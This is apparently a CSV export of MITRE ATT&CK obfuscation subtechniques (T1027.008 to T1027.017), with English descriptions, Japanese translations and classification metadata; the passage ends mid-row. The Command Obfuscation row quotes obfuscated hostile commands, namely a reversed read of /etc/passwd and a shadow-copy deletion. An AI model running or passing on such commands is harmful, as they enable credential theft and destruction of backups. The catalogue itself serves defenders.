マルウェアが呼び出すAPI関数は、ペイロードファイル内の文字列などの静的アーティファクトを残す可能性がある。防御側アナリストは、インポートアドレステーブル（IAT）や、関数を提供する共有モジュールと呼び出しコードを動的にリンクするその他の構造体を介して、バイナリファイルが実行する関数を特定できる場合もある。（引用: Huntress API Hash）（引用: IRED API Hashing）静的解析やその他の防御分析を回避するため、攻撃者は動的API解決を用いてマルウェアの特性や機能を隠蔽する可能性がある。 [ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と同様に、動的API解決はファイル署名を変化させ、悪意のあるAPI関数呼び出しを実行時に解決・呼び出されるまで難読化します。 マルウェアによるAPI関数呼び出しを難読化するには様々な手法が用いられる。例えば、関数名のハッシュ値がリテラル文字列の代わりにマルウェア内に保存されるケースが一般的である。マルウェアはこれらのハッシュ値（または他の識別子）を用いて、`GetProcAddress()`や`LoadLibrary()`などの関数でリンク・ロードプロセスを手動で再現できる。 これらのハッシュ/識別子は、暗号化やその他の文字列操作のトリックを用いてさらに難読化される場合もある（実行時に様々な形式の[ファイルや情報の難読化解除/復号化](https://attack.mitre.org/techniques/T1140)が必要となる）。(引用: BlackHat API Packers)(引用: Drakonia HInvoke)(引用: Huntress API Hash),defense-evasion,Windows,destructive_impact,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4,2022-08-22T20:42:08.498Z,2025-04-15T22:24:25.266Z,,,,
T1027.008,T1027,Stripped Payloads,剥ぎ取られたペイロード,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018) Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",攻撃者は、シンボル、文字列、その他人間が読める情報を除去することでペイロードの解析を困難にしようとする場合があります。スクリプトや実行ファイルには、開発者がコードの機能を文書化するのに役立つ変数名やその他の文字列が含まれていることがあります。 シンボルは、実行可能ペイロードがコンパイルされる際にオペレーティングシステムの`リンカー`によって生成されることが多い。リバースエンジニアは、これらのシンボルや文字列を利用してコードを分析し、ペイロードの機能を特定する。(引用: Mandiant golang stripped binaries explanation)(引用: intezer stripped binaries elf files 2018) 攻撃者は、マルウェア分析を困難にするために、ストリップされたペイロードを使用する場合がある。 例えば、コンパイラやその他のツールには、文字列やシンボルを削除または難読化する機能を提供するものがあります。攻撃者はまた、検出や分析を回避するために、実行専用AppleScript（[AppleScript](https://attack.mitre.org/techniques/T1059/002)のコンパイル済みストリップ版）などのストリップされたペイロード形式を使用してきました。 人間が読み取れる情報の欠如は、ペイロードの検出と分析を直接妨げる可能性がある。(引用元: SentinelLabs reversing run-only applescripts 2021),defense-evasion,macOS;Linux;Windows;Network Devices,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--2f41939b-54c3-41d6-8f8b-35f1ec18ed97,2022-09-29T18:30:12.244Z,2025-04-15T19:58:18.337Z,,,,
T1027.009,T1027,Embedded Payloads,埋め込みペイロード,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",攻撃者は防御から悪意のあるコンテンツを隠蔽するため、他のファイル内にペイロードを埋め込むことがある。一見無害なファイル（スクリプトや実行ファイルなど）が悪用され、悪意のあるペイロードやコンテンツを運搬・難読化することがある。 場合によっては、埋め込まれたペイロードは、デジタル署名や公証チケットなどの実行制御に影響を与えないことで、攻撃者が[信頼制御を破壊](https://attack.mitre.org/techniques/T1553)することを可能にする場合もあります。(引用元: Sentinel Labs)攻撃者は、ペイロードを隠すために様々なファイル形式にペイロードを埋め込む可能性があります。(引用元: Microsoft Learn) これは[ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)と類似していますが、正当なデジタルメディアフォーマットに関連する特定のバイトやパターンに悪意のあるコンテンツを織り込むことは伴いません。(引用元: GitHub PSImage) 例えば、攻撃者が一見無害なバイナリ内部やオーバーレイとしてペイロードを埋め込む事例が確認されています。(引用元: Securelist Dtrack2) 攻撃者が同一形式のファイル内に実行可能ファイルや実行専用スクリプトなどのペイロードをネストさせる事例も確認されている。(引用元: SentinelLabs reversing run-only applescripts 2021) 埋め込まれたコンテンツは、良性のシステムプロセスを感染させるための [プロセスインジェクション](https://attack.mitre.org/techniques/T1055) ペイロードとしても使用される可能性がある。(引用元: Trend Micro) こうした埋め込み後に注入されるペイロードは、オーケストレーターモジュールを支援するC2通信の暗号化など、特定の機能を提供するマルウェアモジュールの一部として使用される可能性がある。例えば、埋め込まれたモジュールがデフォルトブラウザに注入され、攻撃者がネットワーク経由で通信できるようにする場合がある。(引用元: Malware Analysis Report ComRAT),defense-evasion,macOS;Windows;Linux,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1,2022-09-30T18:50:14.351Z,2025-04-15T19:58:03.051Z,,,,
T1027.010,T1027,Command Obfuscation,コマンド難読化,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE) For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing, `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor E“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017) Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC) Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",攻撃者は、検出を妨げるためコマンド実行時に内容を難読化することがある。コマンドライン難読化は、コマンドやスクリプト内の文字列やパターンをシグネチャ検出や解析が困難にする手法である。この種の難読化は、配信されたペイロードによって実行されるコマンド（例： [フィッシング](https://attack.mitre.org/techniques/T1566) や [ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)) によって配信されるペイロードが実行するコマンド内、あるいは [コマンドおよびスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059) を介した対話的な操作で組み込まれる可能性がある。(引用元: Akamai JS)(引用元: Malware Monday VBE) 例えば、攻撃者は様々な記号やエスケープ文字（スペース、`^`、`+`、`$`、`%`など）を利用する構文を悪用し、意図した機能を維持しながらコマンドの解析を困難にすることがあります。(引用: RC PowerShell) 多くの言語は、base64やURLエンコーディングといった形式で組み込みの難読化をサポートしている。(引用: Microsoft PowerShellB64) 攻撃者はまた、文字列分割（`“Wor E“d.Application”`）、文字の順序や大文字小文字の変更（`rev <<<'dwssap/cte/ tac'`）、グロブ展開（`mkdir -p '/tmp/:&$NiA'`）、トークン/環境変数/入力ストリームを介した文字列の受け渡しなど、様々な手法を用いて手動でコマンド難読化を実施する場合がある。(引用元: Bashfuscator Command Obfuscators)(引用元: FireEye Obfuscation June 2017) 攻撃者は、ディレクトリトラバーサルなどの手法を用いて、コマンドによって呼び出されるバイナリへの参照を難読化することもある（例: `C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`）。(引用元: Twitter Richard WMIC) <code>Invoke-Obfuscation</code> や <code>Invoke-DOSfucation</code> などのツールもコマンド難読化に使用されている。(引用元: Invoke-DOSfuscation)(引用元: Invoke-Obfuscation),defense-evasion,Linux;macOS;Windows,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377,2023-03-14T17:36:01.022Z,2025-04-15T22:06:13.992Z,,,,
T1027.011,T1027,Fileless Storage,ファイルレスストレージ,"Adversaries may store data in ""fileless"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024) Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022) Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored. Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files.(Citation: Microsoft Fileless)",攻撃者は防御から悪意のある活動を隠蔽するため、「ファイルレス」形式でデータを保存することがあります。ファイルレスストレージは、ファイル以外のあらゆる形式と広く定義できます。Windowsシステムにおける不揮発性ファイルレスストレージの一般的な例には、Windowsレジストリ、イベントログ、WMIリポジトリなどがあります。(引用元: Microsoft Fileless)(引用元: SecureList Fileless) Linuxシステムでは、`/dev/shm`、`/run/shm`、`/var/run`、`/var/lock`などの共有メモリディレクトリもファイルレスストレージと見なされる場合がある。これらのディレクトリに書き込まれたファイルはディスクに保存されず、直接RAMにマッピングされるためである。(引用元: Elastic Binary Executed from Shared Memory Directory)(引用元: Akami Frog4Shell 2024)(引用: Aquasec Muhstik Malware 2024) [反射型コードロード](https://attack.mitre.org/techniques/T1620) や [プロセスインジェクション](https://attack.mitre.org/techniques/T1055) などのメモリ内ファイルレス動作と同様に、 ファイルレスデータストレージは、ディスクストレージ上の特定ファイル形式にしかアクセスできないアンチウイルスやその他のエンドポイントセキュリティツールによって検出されない可能性がある。ファイルレスストレージを活用することで、攻撃者はLinuxの読み取り専用ファイルシステムが提供する保護を回避することも可能となる。(引用元: Sysdig Fileless Malware 23022) 攻撃者は、ペイロード/シェルコード（[永続化](https://attack.mitre.org/tactics/TA0003)の一環として使用される可能性がある）や、被害者からまだ漏洩されていない収集データ（例: [ローカルデータステージング](https://attack.mitre.org/techniques/T1074/001)）など）を隠蔽するために使用することがあります。また、攻撃者は保存時にこのファイルレスデータを暗号化、符号化、結合、あるいはその他の方法で難読化することもよくあります。 一部のファイルレス保存活動は、ファイルシステムに間接的な痕跡を生成する場合があるが、WMI（例：`%SystemRoot%\System32\Wbem\Repository`）やレジストリ（例：`%SystemRoot%\System32\Config`）といった物理ファイルなど、中心的な検査が困難な形式で残される。（引用元: Microsoft Fileless）,defense-evasion,Windows;Linux,script_command_execution,stealth,authentication_system;privileged_account;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939,2023-03-23T19:55:25.546Z,2025-04-15T22:35:48.121Z,,,,
T1027.012,T1027,LNK Icon Smuggling,LNKアイコン密輸,"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017) LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",攻撃者は、一見無害なWindowsショートカットファイル内に悪意のあるペイロードをダウンロードするコマンドを隠蔽することで、コンテンツフィルターを迂回させることがあります。Windowsショートカットファイル（.LNK）には多くのメタデータフィールドが含まれており、その中にはホストディレクトリ内でLNKファイルに表示されるアイコンファイルのパスを指定するためのアイコン位置フィールド（`IconEnvironmentDataBlock`としても知られる）があります。攻撃者はこのLNKメタデータを悪用して悪意のあるペイロードをダウンロードすることがあります。 例えば、LNKファイルをフィッシングペイロードとして悪用しマルウェアを配布する事例が確認されている。一度起動されると（例：[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）、LNKアイコン位置フィールド内の外部URL経由で参照されたペイロードがダウンロードされる可能性がある。 これらのファイルは、LNKのターゲットパスフィールド内の[コマンドとスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)/[システムバイナリプロキシ実行](https://attack.mitre.org/techniques/T1218)引数によっても起動される可能性があります。(引用: ショートカットの保護解除)(引用: ブービートラップショートカット 2017)LNK アイコンの密輸は、侵害後の段階でも利用される可能性があります。例えば、感染したホスト上で LNK を実行する悪意のあるスクリプトが、追加の悪意のあるペイロードをダウンロードする場合などです。,defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--887274fc-2d63-4bdc-82f3-fae56d1d5fdc,2023-09-29T15:28:42.409Z,2025-04-15T22:44:37.776Z,,,,
T1027.013,T1027,Encrypted/Encoded File,暗号化/エンコードされたファイル,"Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use. This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64. The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection. For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",攻撃者は、検出を妨げるため、文字列、バイト、その他の特定パターンを難読化するためにファイルを暗号化またはエンコードする場合があります。ファイル内容の暗号化および/またはエンコードは、侵入に使用されるファイル内の悪意のあるアーティファクトを隠蔽することを目的としています。他にも、[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)、 [ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)、[埋め込みペイロード](https://attack.mitre.org/techniques/T1027/009)など、多くの他の技術もこの広範な目的を共有している。 ファイルの暗号化や符号化は、静的シグネチャ検出を一時的に回避させる可能性があるが、実行/使用時に悪意のある内容が露見する（すなわち、[ファイルや情報の難読化解除/復号化](https://attack.mitre.org/techniques/T1140)）。 この種のファイル難読化は、マルウェアのログ/設定ファイルやペイロードファイルなど、被害者ホスト上に存在する多くのファイルアーティファクトに適用可能です。（引用元: ファイル難読化）ファイルは、ハードコードされた鍵やユーザー指定の鍵で暗号化されるほか、Base64などの標準的な符号化方式を用いて難読化されることもあります。 ファイル全体を難読化することも、特定の機能や値（C2アドレスなど）のみを難読化することも可能です。 追加保護のため、暗号化と符号化を冗長な層で適用することも可能です。例えば、攻撃者はパスワード保護されたWord文書や自己解凍型(SFX)アーカイブを悪用し、[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードなどのファイルを暗号化/符号化する手法として使用することがあります。 これらのファイルは通常、意図したアーカイブ内容を、ファイルが呼び出されたときに実行される解凍スタブに添付することで機能します（例：[ユーザー実行](https://attack.mitre.org/techniques/T1204)）。（引用元：SFX - 暗号化/エンコードされたファイル）攻撃者は、ファイル固有のエンコーディング方式やカスタムエンコーディング方式も悪用する可能性があります。 たとえば、テキストファイルのバイト順マーク (BOM) ヘッダーは、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059) が実行されるまで、ファイルの内容を操作および難読化するために悪用される可能性があります。,defense-evasion,Linux;macOS;Windows,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144,2024-03-29T12:38:17.135Z,2025-04-15T19:58:05.840Z,,,,
T1027.014,T1027,Polymorphic Code,多形コード,"Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)","攻撃者は、検出回避のためにポリモーフィックコード（メタモーフィックコードまたはミューテートコードとも呼ばれる）を利用することがあります。ポリモーフィックコードとは、コード実行中にその実行時のフットプリントを変更できるソフトウェアの一種です。(引用元: polymorphic-blackberry) ソフトウェアが実行されるたびに、コードは元の目的や目標を達成する別のバージョンへと変異します。 この機能により、マルウェアはアンチウイルスやアンチマルウェアツールなどの従来のシグネチャベース防御を回避できる。(引用元: polymorphic-sentinelone) ポリモーフィックコードと組み合わせて他の難読化技術を使用し、意図した効果を達成することも可能である。これには変異エンジンを用いた以下の操作が含まれる: [ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002), [コマンド難読化](https://attack.mitre.org/techniques/T1027/010)、[暗号化/符号化ファイル](https://attack.mitre.org/techniques/T1027/013)などの操作を実行する変異エンジンの使用などです。(引用元: polymorphic-linkedin)(引用元: polymorphic-medium)",defense-evasion,Windows;macOS;Linux,script_command_execution,stealth,mfa_in_use;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b577dfc1-0177-4522-8d5a-782127c8592b,2024-09-27T12:28:03.938Z,2025-04-15T19:59:00.006Z,,,,
T1027.015,T1027,Compression,圧縮,"Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020) In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point) File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News) [Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.",攻撃者は、ペイロードやファイルを難読化するために圧縮を使用する場合があります。ZIP、gzip、7z、RARなどの圧縮ファイル形式は、複数のファイルをまとめて圧縮・アーカイブすることで、ファイル転送をより容易かつ高速にします。 ファイルの圧縮に加え、攻撃者はシェルコード自体を直接圧縮することもある。例えば、Windowsレジストリキー（すなわち[ファイルレスストレージ](https://attack.mitre.org/techniques/T1027/011)）に保存するためである。（出典：Trustwave Pillowmint 2020年6月）検知回避をさらに強化するため、攻撃者は複数のZIPファイルを単一のアーカイブに結合する場合があります。この連結プロセスにより、一見単一のアーカイブに見えますが、実際には埋め込まれたアーカイブの中核ディレクトリを含む構造が形成されます。 7zipなどの一部のZIPリーダーは連結されたZIPファイルを識別できず、悪意のあるペイロードの存在を見逃す可能性があります。（引用元：Perception Point）ファイルアーカイブは、電子メールを通じて単一の[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)として送信される場合があります。 攻撃者は、ユーザーが操作してシステムに悪意のあるペイロードを抽出するよう促すため、アーカイブファイルとして悪意のあるペイロードを送信しています（例：[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）。(出典: NTT Security Flagpro new 2021年12月) ただし、7zipなどの一部のファイル圧縮ツールは、自己解凍型アーカイブの作成に使用できます。攻撃者は、ペイロードの機能を隠蔽し、ユーザーによる複数の操作を必要とせずに起動させるために、自己解凍型アーカイブを送信する場合があります。（引用元：The Hacker News）[圧縮](https://attack.mitre.org/techniques/T1027/015) は、圧縮ファイルを暗号化しパスワード保護する[暗号化/エンコードされたファイル](https://attack.mitre.org/techniques/T1027/013) と組み合わせて使用される場合があります。,defense-evasion,Linux;Windows;macOS,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--fbd91bfc-75c2-4f0c-8116-3b4e722906b3,2025-03-04T18:29:33.850Z,2025-04-15T19:59:24.125Z,,,,
T1027.016,T1027,Junk Code Insertion,ジャンクコード挿入,"Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code) No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs) The use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.",攻撃者は、マルウェアの機能を難読化するためにジャンクコード/デッドコードを使用することがあります。ジャンクコードとは、実行されないコード、あるいは実行されてもコードの機能を変更しないコードです。ジャンクコードは、分析者がメインコードを分析する代わりに非機能的なコードをステップ実行するため、分析をより困難かつ時間のかかるものにします。 また、特に[圧縮](https://attack.mitre.org/techniques/T1027/015)や[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と組み合わせた場合、無害な機能を利用することで静的コード解析に依存する検出を妨げる可能性がある。(引用元: ReasonLabs)(引用元: ReasonLabs Cyberpedia Junk Code) x86アセンブリ言語で一般的に使用されるデッドコードの一例がノーオペレーション(NOP)命令である。通常0x90オペコードとして使用される。マルウェアにNOPが追加されると、逆アセンブラがNOP命令を表示し、解析者がそれらをステップ実行する必要が生じる。(引用元: ReasonLabs) ジャンクコード/デッドコードの挿入は、単にマルウェアのシグネチャを変更するのではなく、コードの機能を難読化することを目的としている点で、[バイナリパディング](https://attack.mitre.org/techniques/T1027/001)とは区別される。,defense-evasion,Linux;macOS;Windows,defense_disable,stealth,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--671cd17f-a765-48fd-adc4-dad1941b1ae3,2025-03-04T21:38:49.913Z,2025-04-15T19:58:37.495Z,,,,
T1027.017,T1027,SVG Smuggling,SVG密輸,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. SVG smuggling can take a number of forms. For example, threat actors may include content that: * Assembles malicious payloads(Citation: Talos SVG Smuggling 2022) * Downloads malicious payloads(Citation: Cofense SVG Smuggling 2024) * Redirects users to malicious websites(Citation: Bleeping Computer SVG Smuggling 2024) * Displays interactive content to users, such as fake login forms and download buttons.(Citation: Bleeping Computer SVG Smuggling 2024) SVG Smuggling may be used in conjunction with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where an SVG with a malicious payload is included inside an HTML file.(Citation: Talos SVG Smuggling 2022) SVGs may also be included in other types of documents, such as PDFs.",攻撃者は、一見無害なSVGファイル内に悪意のあるペイロードを隠すことで、コンテンツフィルターを迂回してデータやファイルを密輸することがあります。(出典: Trustwave SVG Smuggling 2025) SVG（Scalable Vector Graphics）はXMLを用いて構築されるベクターベースの画像ファイルです。この特性上、正当な`<script>`タグを含めることが可能であり、攻撃者はこれを利用して悪意のあるJavaScriptペイロードを埋め込むことができます。 しかし、SVGは画像ファイルとして扱われることが多いため、他の実行可能ファイルよりもユーザーに不審に思われにくい場合があります。SVG密輸には様々な形態があります。 例えば、脅威アクターは以下のコンテンツを含める可能性があります：* 悪意のあるペイロードを組み立てる（引用元：Talos SVG Smuggling 